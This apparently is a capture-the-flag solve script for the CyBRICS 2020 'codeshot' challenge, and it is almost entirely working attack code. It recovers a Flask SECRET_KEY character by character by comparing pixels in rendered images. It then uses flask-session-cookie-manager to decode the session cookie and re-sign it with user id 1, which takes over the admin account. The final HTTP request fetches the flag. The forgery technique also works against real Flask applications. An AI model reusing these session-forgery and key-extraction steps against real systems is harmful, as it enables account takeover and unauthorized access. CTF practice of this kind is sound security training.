from PIL import Image
import requests

cookies = {"session": ".eJwlzj0OwjAMQOG7ZGaIY8c_vUyV2I5gbemEuDuVmN8bvk_Z15Hns2zv48pH2V9RtuJhpGp9WfJUgba8z8ptTRYioNVQVyYxoDOJscUSHDClQZCOOsx1uDcEwjr0rirqU7BlzpoQgR00GQOJI5RBWq_EeO_GUW7Idebx1zBZ-f4A6Egurg.XxyuGg._S-bIVLJ1xltFj2Be5YKPB_uxWE"}
headers_post = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://codeshot-cybrics2020.ctf.su/profile", "Content-Type": "multipart/form-data; boundary=---------------------------3774721316872016531394040701", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
headers_get = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
data = "-----------------------------3774721316872016531394040701\r\nContent-Disposition: form-data; name=\"code\"\r\n\r\nfrom helpers import apply_blur_filter\r\n\r\napp = Flask (__name__)\r\napp.config['UPLOAD_FOLDER'] = 'uploads'\r\napp.config['SECRET_KEY'] = '%s'\r\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite'\napp.config['MAX_CONTENT_LENGTH'] = 500 * 1024 # 500Kb\r\n\r\nBootstrap (app)\r\ndb = SQLAlchemy (app)\r\n-----------------------------3774721316872016531394040701\r\nContent-Disposition: form-data; name=\"is_private\"\r\n\r\n1\r\n-----------------------------3774721316872016531394040701\r\nContent-Disposition: form-data; name=\"x\"\r\n\r\n28\r\n-----------------------------3774721316872016531394040701\r\nContent-Disposition: form-data; name=\"y\"\r\n\r\n3\r\n-----------------------------3774721316872016531394040701\r\nContent-Disposition: form-data; name=\"x_size\"\r\n\r\n10\r\n-----------------------------3774721316872016531394040701\r\nContent-Disposition: form-data; name=\"y_size\"\r\n\r\n2\r\n-----------------------------3774721316872016531394040701--\r\n"

alphabet = "0123456789abcdefghijklmnopqrstuvwxyz"
secret_key = '__________9ftys7dfstf'
sol = ""

chall = Image.open("chall.png")
chall_pix = chall.load()

while len(sol) < 10:
    for c in alphabet:

        tmp_secret_key = sol + c + secret_key[len(sol)+1:]

        print("[+] tmp_secret_key :",tmp_secret_key)

        response = requests.post("http://codeshot-cybrics2020.ctf.su:80/profile", headers=headers_post, cookies=cookies, data=data % tmp_secret_key)
        img_id = response.text.split('/uploads/649/')[-1].split('">')[0].strip()

        url = "http://codeshot-cybrics2020.ctf.su:80/uploads/649/" + img_id
        img = requests.get(url, headers=headers_get, cookies=cookies).content

        with open('tmp.png','wb') as f:
            f.write(img)

        img = Image.open('tmp.png')
        img_pix = img.load()

        for i in range(180,200,2):
            col = 10 + 10 * (28 + len(sol)) 
            if not chall_pix[col,i] == img_pix[col,i]:
                break
        else:
            sol += c
            break

print(sol)
# secret_key jds89fysd79ftys7dfstf

'''

git clone https://github.com/noraj/flask-session-cookie-manager

python3 flask_session_cookie_manager3.py decode -c '.eJwlzj0OwjAMQOG7ZGaIY8c_vUyV2I5gbemEuDuVmN8bvk_Z15Hns2zv48pH2V9RtuJhpGp9WfJUgba8z8ptTRYioNVQVyYxoDOJscUSHDClQZCOOsx1uDcEwjr0rirqU7BlzpoQgR00GQOJI5RBWq_EeO_GUW7Idebx1zBZ-f4A6Egurg.XxyuGg._S-bIVLJ1xltFj2Be5YKPB_uxWE' -s 'jds89fysd79ftys7dfstf'
{'_fresh': True, '_id': 'cd948895f9e6b8712fc5b062fb674414f238fee4613c647969df73a1b721d48a0a9c8acc231430a8df7878cb732eeb0e1dd3518e63d346dd861725046343096d', '_user_id': '649'}

python3 flask_session_cookie_manager3.py encode -s 'jds89fysd79ftys7dfstf' -t "{'_fresh': True, '_id': 'cd948895f9e6b8712fc5b062fb674414f238fee4613c647969df73a1b721d48a0a9c8acc231430a8df7878cb732eeb0e1dd3518e63d346dd861725046343096d', '_user_id': '1'}"
.eJwlzjkOwjAQQNG7uKbwLJ4ll4lsz1jQJqRC3J1I1P8X71P2deT5LNv7uPJR9leUrcxwNvO2PGWYAq7ZRhVcQ5QZeCHZymQBmsLq4rGUOgxFCLZeu0_rcyIBU-12V1ObQwkzR02IoAaWQkEsESag2CoL3btLlBtynXn8NVC-P4t6Ljw.Xx0Fgw.qX_e32dIbiGtPG5tHqIupW13eko

GET /uploads/1/5 HTTP/1.1
Host: codeshot-cybrics2020.ctf.su
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=.eJwlzjkOwjAQQNG7uKbwLJ4ll4lsz1jQJqRC3J1I1P8X71P2deT5LNv7uPJR9leUrcxwNvO2PGWYAq7ZRhVcQ5QZeCHZymQBmsLq4rGUOgxFCLZeu0_rcyIBU-12V1ObQwkzR02IoAaWQkEsESag2CoL3btLlBtynXn8NVC-P4t6Ljw.Xx0Fgw.qX_e32dIbiGtPG5tHqIupW13eko
Upgrade-Insecure-Requests: 1

Et tadaaaaa => Flag : cybrics{w0w_whythisfilterisnotalreadyinphotoshop}